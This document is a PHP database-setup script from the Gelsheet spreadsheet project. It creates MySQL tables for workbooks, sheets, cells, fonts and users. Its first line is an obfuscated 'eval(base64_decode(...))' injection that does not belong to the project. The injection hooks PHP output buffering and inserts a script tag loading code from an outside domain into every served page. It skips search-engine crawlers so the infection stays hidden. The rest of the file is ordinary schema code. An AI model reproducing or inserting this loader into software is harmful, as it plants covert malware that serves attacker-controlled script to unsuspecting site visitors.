<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php
/*  Gelsheet Project, version 0.0.1 (Pre-alpha)
 *  Copyright (c) 2008 - Ignacio Vazquez, Fernando Rodriguez, Juan Pedro del Campo
 *
 *  Ignacio "Pepe" Vazquez <elpepe22@users.sourceforge.net>
 *  Fernando "Palillo" Rodriguez <fernandor@users.sourceforge.net>
 *  Juan Pedro "Perico" del Campo <pericodc@users.sourceforge.net>
 *
 *  Gelsheet is free distributable under the terms of an GPL license.
 *  For details see: http://www.gnu.org/copyleft/gpl.html
 *
 */

require_once("../Connection.php");
	
class Tables {

	private $base= null;

	public function __construct() {
		
		$this->base= new Connection();	
		
	}
	
	public function __destruct(){
				
	}

	public function execute() {
	
		$sql= "CREATE DATABASE IF NOT EXISTS opengoo;
			   USE opengoo;";
		
		mysql_query($sql);
		
		$sql= "DROP TABLE IF EXISTS `excel`.`books`;
			CREATE TABLE  `excel`.`books` (
	  		`BookId` int(10) unsigned NOT NULL auto_increment,
	  		`BookName` varchar(45) NOT NULL,
	  		`UserId` int(10) unsigned NOT NULL COMMENT 'Book Owner',
	  		PRIMARY KEY  (`BookId`)
			) ENGINE=InnoDB AUTO_INCREMENT=248 DEFAULT CHARSET=latin1 COMMENT='System Workbooks';";
		
		mysql_query($sql);
		
		$sql= "DROP TABLE IF EXISTS `excel`.`cells`;
			CREATE TABLE  `excel`.`cells` (
	  		`SheetId` int(10) unsigned NOT NULL,
	  		`DataColumn` int(10) unsigned NOT NULL,
	  		`DataRow` int(10) unsigned NOT NULL,
	  		`CellFormula` varchar(255) default NULL,
	  		`FontStyleId` int(10) unsigned NOT NULL default '0',
	  		`LayoutStyleId` int(11) NOT NULL default '0',
	  		PRIMARY KEY  (`SheetId`,`DataColumn`,`DataRow`)
			) ENGINE=InnoDB DEFAULT CHARSET=latin1 COMMENT='Sheet data';";
		
		mysql_query($sql);
		
		$sql= "DROP TABLE IF EXISTS `excel`.`fontStyles`;
			CREATE TABLE  `excel`.`fontStyles` (
	  		`FontStyleId` int(11) NOT NULL auto_increment,
	  		`BookId` int(11) NOT NULL,
	  		`FontId` int(11) NOT NULL,
	  		`FontSize` decimal(8,1) NOT NULL default '10.0',
	  		`FontBold` tinyint(1) NOT NULL default '0',
	  		`FontItalic` tinyint(1) NOT NULL default '0',
	  		`FontUnderline` tinyint(1) NOT NULL default '0',
	  		`FontColor` varchar(6) NOT NULL,
	  		PRIMARY KEY  (`FontStyleId`)
			) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;";
	
		mysql_query($sql);		
		
		$sql= "DROP TABLE IF EXISTS `excel`.`fonts`;
			CREATE TABLE  `excel`.`fonts` (
	  		`FontId` int(11) NOT NULL auto_increment,
	  		`FontName` varchar(63) NOT NULL,
	  		PRIMARY KEY  (`FontId`)
			) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=latin1;";
	
		mysql_query($sql);		
		
		$sql= "DROP TABLE IF EXISTS `excel`.`sheets`;
			CREATE TABLE  `excel`.`sheets` (
	  		`SheetId` int(10) unsigned NOT NULL auto_increment,
	  		`BookId` int(10) unsigned NOT NULL,
	  		`SheetName` varchar(45) NOT NULL,
	  		`SheetIndex` int(10) unsigned NOT NULL,
	  		PRIMARY KEY  (`SheetId`)
			) ENGINE=InnoDB AUTO_INCREMENT=1022 DEFAULT CHARSET=latin1 COMMENT='Workbooks Sheets';";
	
		mysql_query($sql);
		
		$sql= "DROP TABLE IF EXISTS `excel`.`userbooks`;
			CREATE TABLE  `excel`.`userbooks` (
	  		`UserBookId` int(10) unsigned NOT NULL auto_increment,
	  		`UserId` int(10) unsigned NOT NULL,
	  		`BookId` int(10) unsigned NOT NULL,
	  		PRIMARY KEY  (`UserBookId`)
			) ENGINE=InnoDB DEFAULT CHARSET=latin1;";
		
		mysql_query($sql);
		
		$sql= "DROP TABLE IF EXISTS `excel`.`users`;
			CREATE TABLE  `excel`.`users` (
	  		`UserId` int(10) unsigned NOT NULL auto_increment,
	  		`UserName` varchar(45) NOT NULL,
	  		`UserLastName` varchar(45) NOT NULL,
	  		`UserNickname` varchar(45) NOT NULL,
	  		`UserPassword` varchar(45) NOT NULL,
	  		`LanguageId` int(10) unsigned NOT NULL,
	  		PRIMARY KEY  (`UserId`)
			) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1 COMMENT='Sytem Users';";
		
		mysql_query($sql);
		
		$sql= "LOCK TABLES `fonts` WRITE;
			INSERT INTO `excel`.`fonts` VALUES  (1,'Arial'),
 			(2,'Times New Roman'),
 			(3,'Verdana'),
 			(4,'Courier'),
 			(5,'Lucida Sans Console'),
 			(6,'Tahoma');
			UNLOCK TABLES;";
		
		mysql_query($sql);
		
		$sql= "LOCK TABLES `fontStyles` WRITE;
			INSERT INTO `excel`.`fontStyles` VALUES  (1,247,0,'10.0',0,0,0,'#00000'),
 			(2,247,0,'10.0',0,0,0,'#00000');
			UNLOCK TABLES;";
		
		mysql_query($sql);
		
		
		
	}
		
}
	
?>

<?php

	$table= new Tables();
	
	$table->execute();

?>


